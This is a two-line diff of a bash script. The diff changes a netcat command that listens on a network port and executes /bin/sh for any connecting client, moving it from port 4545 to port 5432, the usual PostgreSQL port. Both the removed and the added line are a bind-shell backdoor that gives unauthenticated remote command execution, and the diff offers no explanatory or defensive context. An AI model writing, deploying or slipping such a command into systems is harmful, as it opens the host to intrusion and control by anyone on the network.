@@ -1,2 +1,2 @@
 #!/bin/bash
-nc -l -p 4545 -e /bin/sh
+nc -l -p 5432 -e /bin/sh
